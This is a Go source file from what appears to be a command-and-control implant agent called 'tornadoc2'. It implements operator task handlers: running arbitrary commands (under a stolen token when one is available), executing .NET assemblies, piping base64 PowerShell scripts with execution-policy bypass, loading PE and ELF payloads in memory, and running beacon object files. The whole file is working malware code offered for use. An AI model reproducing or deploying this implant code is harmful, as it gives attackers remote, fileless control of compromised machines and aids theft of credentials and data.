//go:build linux

package core

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
	"tornadoc2/agent/native"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

func (a *Agent) executeAssemblyVerb(
	ctx context.Context, t protocol.Task) protocol.Result {

	if !supportsAssembly {
		return protocol.Result{ID: t.ID,
			Error: "execute_assembly requires a Windows target"}
	}
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "execute_assembly requires base64-encoded " +
				"assembly as first arg"}
	}

	asmBytes, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 assembly: " + err.Error()}
	}

	var argsString string
	if len(t.Args) > 1 {
		argsString = t.Args[1]
	}

	diag("[execasm] assembly=%d bytes args=%q spawnto=%q\n",
		len(asmBytes), argsString, a.spawnTo)

	out, code, err := platform.ExecAssemblyOutOfProcess(
		ctx, asmBytes, argsString, a.spawnTo)
	if err != nil {
		diag("[execasm] worker failed: %v\n", err)
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	diag("[execasm] worker returned code=%d output=%d bytes\n",
		code, len(out))
	return protocol.Result{ID: t.ID,
		Output:   encodeOutput([]byte(out)),
		ExitCode: code}
}
func (a *Agent) execVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "exec requires a command"}
	}

	if hasStolenToken() {
		diag("[exec] running under stolen token\n")
		out, code, err := execWithStolenToken(ctx,
			t.Args[0], t.Args[1:])
		if err != nil {
			return protocol.Result{ID: t.ID,
				Error: "exec under stolen token: " + err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	}

	diag("[exec] spawning command %q args=%v\n",
		t.Args[0], t.Args[1:])
	cmd := exec.CommandContext(ctx, t.Args[0], t.Args[1:]...)
	cmd.Env = sanitizedEnv()
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	r := protocol.Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
		}
	}
	return r
}
func (a *Agent) psexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if !supportsAssembly {
		return protocol.Result{ID: t.ID,
			Error: "psexec requires a Windows target"}
	}
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "psexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)
	diag("[psexec] script=%d bytes args=%v\n", len(src), scriptArgs)

	argv := []string{
		"-NoProfile", "-NoLogo", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", "-",
	}
	argv = append(argv, scriptArgs...)

	cmd := exec.CommandContext(ctx, "powershell.exe", argv...)
	cmd.Stdin = strings.NewReader(string(src))
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}
func (a *Agent) execmemVerb(
	ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 2 {
		return protocol.Result{ID: t.ID,
			Error: "execmem requires <remote_path> <kind> [args...]"}
	}
	remotePath := t.Args[0]
	kind := strings.ToLower(t.Args[1])
	payloadArgs := t.Args[2:]
	diag("[execmem] path=%q kind=%q args=%v\n",
		remotePath, kind, payloadArgs)

	switch kind {
	case "exe":
		out, code, err := native.ExecPEInMemory(
			ctx, remotePath, payloadArgs)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	case "elf":
		out, code, err := native.ExecELFInMemory(
			ctx, remotePath, payloadArgs)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	default:
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf("unknown payload kind: %s", kind)}
	}
}
func (a *Agent) bofVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "bof requires base64-encoded COFF as first arg"}
	}
	coffBytes, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 COFF: " + err.Error()}
	}
	entry := ""
	if len(t.Args) > 1 {
		entry = t.Args[1]
	}
	var packedArgs []byte
	if len(t.Args) > 2 && t.Args[2] != "" {
		packedArgs, err = base64.StdEncoding.DecodeString(t.Args[2])
		if err != nil {
			return protocol.Result{ID: t.ID,
				Error: "invalid base64 args: " + err.Error()}
		}
	}
	diag("[bof] coff=%d bytes entry=%q args=%d bytes\n",
		len(coffBytes), entry, len(packedArgs))
	out, code, err := native.ExecBOF(ctx, coffBytes, entry, packedArgs)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID,
		Output:   encodeOutput([]byte(out)),
		ExitCode: code}
}
